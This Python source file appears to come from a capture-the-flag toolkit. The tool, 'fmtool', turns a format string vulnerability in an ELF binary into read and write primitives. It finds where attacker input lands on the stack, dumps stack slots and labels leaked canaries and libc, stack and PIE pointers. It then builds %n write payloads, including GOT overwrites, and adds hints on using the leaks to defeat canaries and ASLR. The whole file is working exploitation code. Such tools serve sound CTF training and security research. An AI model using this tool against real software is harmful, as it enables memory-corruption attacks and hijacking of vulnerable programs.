"""fmtool: turn a format string bug into a read and a write.

    fmtool ./fmt                        # find where your input lands, dump the stack
    fmtool ./fmt --leak                 # classify what is leakable: canary, libc, PIE
    fmtool ./fmt --write 0x404028=0x401196
    fmtool ./fmt --got puts --to 0x401196
"""

from __future__ import annotations

import re
import sys

from ctftools.core import term
from ctftools.core.binary import load_binary
from ctftools.core.cliutil import (
    add_common_args,
    add_run_args,
    apply_output_flags,
    base_parser,
    fail,
    parse_escapes,
    resolve_binary,
)
from ctftools.core.report import Report
from ctftools.core.runner import Limits, run_target

HEX = re.compile(rb"0x([0-9a-f]+)")


def probe_offset(path: str, prefix: bytes = b"", args=(), timeout: float = 3.0,
                 limit: int = 40, sandbox: bool = True, word: int = 8) -> dict:
    """Find which ``%N$p`` prints the attacker's own bytes."""
    limits = Limits(enabled=sandbox)
    marker = b"AAAAAAAA" if word == 8 else b"AAAA"
    expected = int.from_bytes(marker, "little")

    for index in range(1, limit + 1):
        payload = prefix + marker + b"|%" + str(index).encode() + b"$p\n"
        run = run_target(path, payload, args=args, timeout=timeout, limits=limits)
        for value in HEX.findall(run.stdout):
            if int(value, 16) == expected:
                return {"offset": index, "marker": marker.decode(), "confirmed": True}
    return {"offset": None, "marker": marker.decode(), "confirmed": False}


def dump_stack(path: str, count: int = 30, prefix: bytes = b"", args=(),
               timeout: float = 3.0, sandbox: bool = True, batch: int = 6) -> list:
    """Read the first *count* stack slots through ``%N$p``."""
    limits = Limits(enabled=sandbox)
    slots: list = []
    index = 1
    while index <= count:
        group = list(range(index, min(index + batch, count + 1)))
        spec = b"|".join(b"%" + str(i).encode() + b"$p" for i in group)
        run = run_target(path, prefix + spec + b"\n", args=args, timeout=timeout, limits=limits)
        values = run.stdout.split(b"|")
        for position, i in enumerate(group):
            raw = values[position].strip() if position < len(values) else b""
            match = HEX.search(raw)
            slots.append({
                "index": i,
                "value": int(match.group(1), 16) if match else None,
                "raw": raw.decode("latin-1", "replace")[:24],
            })
        index += batch
    return slots


def classify(value: int | None, info) -> str:
    """What a leaked stack value probably is."""
    if value is None:
        return "-"
    if value == 0:
        return "null"
    if value < 0x1000:
        return "small integer"
    high = value >> 32
    # The canary's low byte is always NUL and it is not a pointer.
    if value & 0xFF == 0 and value > 0xFFFFFFFF and not (0x7F00 <= high <= 0x7FFF):
        return "canary"
    # Linux puts the stack at the very top of the 47 bit range and the shared
    # libraries well below it, so the top 16 bits separate the two.
    if 0x7FF0 <= high <= 0x7FFF:
        return "stack pointer"
    if 0x7F00 <= high < 0x7FF0:
        return "libc pointer"
    if not info.pie and 0x400000 <= value <= 0x500000:
        return "binary address"
    if info.pie and 0x550000000000 <= value <= 0x570000000000:
        return "PIE address"
    if all(0x20 <= b < 0x7F for b in value.to_bytes(8, "little").rstrip(b"\x00") or b"\x00"):
        return "ascii: " + value.to_bytes(8, "little").rstrip(b"\x00").decode("latin-1", "replace")
    return "?"


def write_payload(offset: int, writes: dict, word: int = 8, written: int = 0) -> bytes:
    """A %n payload that writes *writes* (address -> value)."""
    from pwnlib.context import context
    from pwnlib.fmtstr import fmtstr_payload

    context.clear()
    context.log_level = "error"
    context.arch = "amd64" if word == 8 else "i386"
    context.bits = word * 8
    return fmtstr_payload(offset, writes, numbwritten=written, write_size="short")


def analyse(path: str, prefix: bytes = b"", args=(), timeout: float = 3.0, count: int = 30,
            sandbox: bool = True, offset: int | None = None, writes: dict | None = None,
            written: int = 0) -> Report:
    info = load_binary(path)
    report = Report(tool="fmtool", target=path)

    found = {"offset": offset, "confirmed": offset is not None, "marker": ""}
    if offset is None:
        found = probe_offset(path, prefix, args, timeout, sandbox=sandbox, word=info.word)
    report.data["input_offset"] = found

    sec = report.section("Where your input lands")
    if found["offset"] is None:
        sec.add("  " + term.bad("not found in the first 40 stack slots"))
        sec.add("  " + term.dim("the input may not reach printf as the format argument, "
                                "or it needs a prefix (--prefix) to get there"))
        report.note("without an input offset there is no write primitive")
    else:
        sec.add(f"  {term.c('%' + str(found['offset']) + '$p', 'bold')} prints your own bytes")
        sec.add(f"  {term.dim('so a write is:')} fmtstr_payload({found['offset']}, {{address: value}})")

    slots = dump_stack(path, count, prefix, args, timeout, sandbox)
    report.data["stack"] = slots

    table_rows = []
    interesting = {"canary": None, "libc pointer": None, "stack pointer": None,
                   "binary address": None, "PIE address": None}
    for slot in slots:
        kind = classify(slot["value"], info)
        slot["classification"] = kind
        base = kind.split(":")[0]
        if base in interesting and interesting[base] is None and slot["value"]:
            interesting[base] = slot
        colour = {
            "canary": term.bad,
            "libc pointer": term.warn,
            "stack pointer": term.warn,
            "binary address": term.warn,
            "PIE address": term.warn,
        }.get(base, term.dim)
        table_rows.append([
            f"%{slot['index']}$p",
            hex(slot["value"]) if slot["value"] is not None else term.dim("-"),
            colour(kind),
        ])

    dump = report.section(f"Stack dump ({count} slots)")
    dump.add(term.table(table_rows, headers=["Specifier", "Value", "Looks like"]))

    leaks = report.section("Worth leaking")
    rows = []
    for kind, slot in interesting.items():
        if slot is None:
            rows.append([kind, term.dim("not seen"), ""])
            continue
        hint = {
            "canary": "send %N$p, then put this back in your overflow payload",
            "libc pointer": "subtract the symbol's offset to get the libc base (libcid)",
            "stack pointer": "gives you the buffer address for stack shellcode",
            "binary address": "confirms the image is where the ELF says",
            "PIE address": "subtract the function offset to get the image base",
        }[kind]
        rows.append([kind, f"%{slot['index']}$p = {slot['value']:#x}", term.dim(hint)])
    leaks.add(term.table(rows, headers=["What", "Where", "Use"]))
    report.data["interesting"] = {
        kind: ({"index": s["index"], "value": s["value"]} if s else None)
        for kind, s in interesting.items()
    }

    if writes and found["offset"]:
        payload = write_payload(found["offset"], writes, info.word, written)
        report.data["write_payload_hex"] = payload.hex()
        report.data["writes"] = {hex(k): hex(v) for k, v in writes.items()}
        section = report.section("Write payload")
        section.add(term.table(
            [[hex(address), hex(value)] for address, value in writes.items()],
            headers=["Address", "Value"],
        ))
        section.add("")
        section.add(f"  {len(payload)} bytes")
        section.add(f"  {term.dim('python:')} {payload!r}")
        section.add("")
        section.add("  " + term.dim("built with:"))
        section.add(f"    fmtstr_payload({found['offset']}, "
                    f"{{{', '.join(f'{hex(k)}: {hex(v)}' for k, v in writes.items())}}})")
        if written:
            section.add(f"    {term.dim('numbwritten=')}{written} {term.dim('(bytes printf already emitted)')}")
    elif writes:
        report.warn("cannot build a write payload without an input offset")

    return report


def parse_writes(values: list, info_word: int = 8) -> dict:
    out = {}
    for item in values:
        if "=" not in item:
            raise ValueError(f"--write wants ADDRESS=VALUE, got {item!r}")
        address, value = item.split("=", 1)
        out[int(address, 0)] = int(value, 0)
    return out


def build_parser():
    parser = base_parser("fmtool", "Find a format string offset, dump the stack, build writes.")
    parser.add_argument("binary", help="the ELF with the format string bug")
    parser.add_argument("--offset", type=int, help="use this input offset instead of probing for it")
    parser.add_argument("--count", type=int, default=30, help="stack slots to dump (default: 30)")
    parser.add_argument("--write", action="append", default=[], metavar="ADDR=VALUE",
                        help="build a payload writing VALUE at ADDR (repeatable)")
    parser.add_argument("--got", help="shorthand: overwrite this GOT entry (needs --to)")
    parser.add_argument("--to", type=lambda v: int(v, 0), help="value for --got")
    parser.add_argument("--written", type=int, default=0,
                        help="bytes printf has already printed before your payload")
    add_run_args(parser)
    add_common_args(parser)
    return parser


def main(argv=None) -> int:
    args = build_parser().parse_args(argv)
    apply_output_flags(args)
    path = resolve_binary(args.binary)

    try:
        writes = parse_writes(args.write)
    except ValueError as exc:
        fail(str(exc))

    if args.got:
        if args.to is None:
            fail("--got needs --to <address>")
        info = load_binary(path)
        entry = (info.elf.got or {}).get(args.got)
        if entry is None:
            fail(f"{args.got} has no GOT entry in this binary")
        writes[int(entry)] = args.to

    report = analyse(
        path,
        prefix=parse_escapes(args.prefix),
        args=args.argv,
        timeout=args.timeout if args.timeout else 3.0,
        count=args.count,
        sandbox=not args.no_sandbox,
        offset=args.offset,
        writes=writes or None,
        written=args.written,
    )
    report.emit(as_json=args.json)
    return 0 if report.data["input_offset"]["offset"] else 1


if __name__ == "__main__":
    sys.exit(main())
